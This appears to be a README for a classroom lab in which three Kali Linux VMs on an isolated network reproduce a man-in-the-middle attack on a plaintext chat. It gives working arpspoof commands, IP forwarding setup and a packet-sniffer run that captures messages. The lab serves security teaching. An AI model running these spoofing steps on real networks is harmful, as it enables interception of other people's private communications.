# Man-in-the-Middle (MITM) Chat Sniffing Exercise

Complete MITM attack demonstration using 3 Kali Linux VMs.

## Overview

This project demonstrates a Man-in-the-Middle attack where:
- **VM1 (Client)** and **VM2 (Server)** communicate via unencrypted chat
- **VM3 (Attacker)** performs ARP spoofing and sniffs the chat messages

## Network Setup

### IP Configuration

| Machine | IP Address | Hostname | Role |
|---------|-----------|----------|------|
| VM1 | 192.168.100.20 | kali-client | Client (Victim) |
| VM2 | 192.168.100.10 | kali-server | Server (Target) |
| VM3 | 192.168.100.30 | kali-attacker | Attacker (MITM) |

### VirtualBox Network Setup

1. **For each VM:**
   - Go to Settings → Network → Adapter 1
   - Set "Attached to": **Internal Network**
   - Name: `mitm-network` (same for all VMs)
   - Promiscuous Mode: **Allow All** (especially for VM3)

2. **Configure Static IPs on each VM:**

   **VM1 (Client):**
   ```bash
   sudo ip addr flush dev eth0
   sudo ip addr add 192.168.100.20/24 dev eth0
   sudo ip link set eth0 up
   ip a  # verify
   ```

   **VM2 (Server):**
   ```bash
   sudo ip addr flush dev eth0
   sudo ip addr add 192.168.100.10/24 dev eth0
   sudo ip link set eth0 up
   ip a  # verify
   ```

   **VM3 (Attacker):**
   ```bash
   sudo ip addr flush dev eth0
   sudo ip addr add 192.168.100.30/24 dev eth0
   sudo ip link set eth0 up
   sudo sysctl -w net.ipv4.ip_forward=1  # Enable IP forwarding for MITM
   ip a  # verify
   ```

3. **Test connectivity:**
   ```bash
   # From each VM, ping the others:
   ping 192.168.100.10  # Server
   ping 192.168.100.20  # Client
   ping 192.168.100.30  # Attacker
   ```

---

## Installation

### All VMs:
```bash
# Update and install Python (usually pre-installed on Kali)
sudo apt update
sudo apt install python3 -y
```

### VM3 (Attacker) only:
```bash
# Install arpspoof (part of dsniff)
sudo apt install dsniff -y
```

---

## Running the Exercise

### **Step 1: Start Monitor (VM3 - Attacker)**
```bash
cd /path/to/project
python3 monitor.py
```
Expected output:
```
============================================================
               MITM MONITOR - ATTACKER VM
============================================================
[*] Monitor listening on port 9001
[*] Waiting for sniffer connection...
============================================================
```

### **Step 2: Start Server (VM2 - Server)**
```bash
cd /path/to/project
python3 server.py
```
Expected output:
```
[*] Server listening on port 8000...
[*] Waiting for client connection...
```

### **Step 3: Start Client (VM1 - Client)**
```bash
cd /path/to/project
python3 client.py
```
Expected output:
```
[*] Connecting to server 192.168.100.10:8000...
[+] Connected to server!
```

### **Step 4: Test Normal Chat (Before Attack)**

Exchange some messages between Client and Server to verify the chat works.

**On Client (VM1):**
```
Type message: Hello from client
```

**On Server (VM2):**
```
[CLIENT]: Hello from client
Type message: Hello from server
```

### **Step 5: Start ARP Spoofing (VM3 - Attacker)**

Open a **new terminal** on VM3:

```bash
# Spoof Client (tell client that we are the server)
sudo arpspoof -i eth0 -t 192.168.100.20 192.168.100.10 &

# Spoof Server (tell server that we are the client)
sudo arpspoof -i eth0 -t 192.168.100.10 192.168.100.20 &
```

You should see output like:
```
0:c:29:xx:xx:xx 0:c:29:yy:yy:yy 0806 42: arp reply ...
```

### **Step 6: Start Sniffer (VM3 - Attacker)**

Open **another terminal** on VM3:

```bash
cd /path/to/project
sudo python3 sniffer.py
```

Expected output:
```
[*] Starting packet sniffer...
[*] Monitoring traffic on port 8000
[*] Forwarding to monitor at 127.0.0.1:9001
[*] Target IPs: ['192.168.100.10', '192.168.100.20']

[+] Connected to monitor
[+] Raw socket created successfully
[*] Sniffing started...
```

### **Step 7: Send Messages and Watch Them Get Sniffed!**

Now exchange messages between Client and Server.

**Monitor terminal (VM3)** should display:
```
============================================================
[PACKET #1]
============================================================
Source MAC      : 00:0c:29:xx:xx:xx
Dest MAC        : 00:0c:29:yy:yy:yy
Protocol        : TCP
Source IP       : 192.168.100.20:45678
Dest IP         : 192.168.100.10:8000
Data Length     : 25 bytes
============================================================
SNIFFED MESSAGE:
This is a secret message!
============================================================
```

---

## Stopping the Attack

1. **Stop sniffer:** Press `Ctrl+C` in sniffer terminal
2. **Stop ARP spoofing:**
   ```bash
   sudo pkill arpspoof
   ```
3. **Stop monitor:** Press `Ctrl+C` in monitor terminal
4. **Stop client and server:** Press `Ctrl+C` in their terminals

---

## Troubleshooting

### "Connection refused" when client tries to connect
- Make sure server is running first
- Verify IPs with `ip a`
- Check firewall: `sudo ufw status` (disable if enabled: `sudo ufw disable`)

### Sniffer not capturing packets
- Make sure ARP spoofing is running (`ps aux | grep arpspoof`)
- Verify IP forwarding: `cat /proc/sys/net/ipv4/ip_forward` (should be `1`)
- Check promiscuous mode in VirtualBox settings
- Make sure running sniffer with `sudo`

### Monitor not receiving data
- Check monitor is running before starting sniffer
- Verify monitor is listening: `netstat -tln | grep 9001`

### Cannot ping between VMs
- Verify all VMs use same Internal Network name
- Check IP configuration with `ip a`
- Try `sudo ip link set eth0 promisc on` on all VMs

---

## Project Files

- `server.py` - Chat server (VM2)
- `client.py` - Chat client (VM1)
- `sniffer.py` - Packet sniffer with forwarding (VM3)
- `monitor.py` - Monitor display (VM3)
- `README.md` - This file

---

## Notes for Report

**Key observations to document:**

1. **Before MITM Attack:**
   - Client and server communicate directly
   - Check ARP tables: `arp -n`

2. **During MITM Attack:**
   - ARP tables are poisoned (both victims think attacker is the other party)
   - All traffic flows through attacker
   - Attacker can see plaintext messages

3. **Security Implications:**
   - Unencrypted communication is vulnerable
   - ARP protocol has no authentication
   - Need encryption (TLS/SSL) to prevent eavesdropping

**Screenshots to capture:**
- Network topology (VirtualBox settings)
- IP configurations (`ip a` on each VM)
- ARP table before attack (`arp -n`)
- ARP table during attack (poisoned entries)
- Monitor showing sniffed messages
- arpspoof running

---

## License

Educational use only. Do not use for unauthorized network attacks.
